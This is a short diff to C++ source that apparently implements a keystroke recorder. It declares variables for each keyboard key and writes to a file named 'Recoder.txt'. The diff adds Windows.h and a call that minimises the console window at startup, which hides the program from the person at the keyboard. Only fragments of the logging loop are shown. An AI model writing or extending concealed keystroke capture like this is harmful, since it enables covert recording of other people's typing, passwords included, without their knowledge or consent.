@@ -1,5 +1,6 @@
 #include <bits/stdc++.h>
 #include <conio.h>
+#include <Windows.h>
 using namespace std;
 int bs,Tab,enter,shift,ctrl,alt,caps,esc,space,page_up,page_down;
 int end,home,left_arrow,up_arrow,right_arrow,dw_arrow,insert,del,num_lock;
@@ -9,6 +10,7 @@ int G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z;
 int zero,one,two,three,four,five,six,seven,eight,nine;
 signed main(){
 	int key;
+	ShowWindow(GetConsoleWindow(),SW_MINIMIZE); 
 	while(1){
 		key = 0;
 		ofstream fout("Recoder.txt");
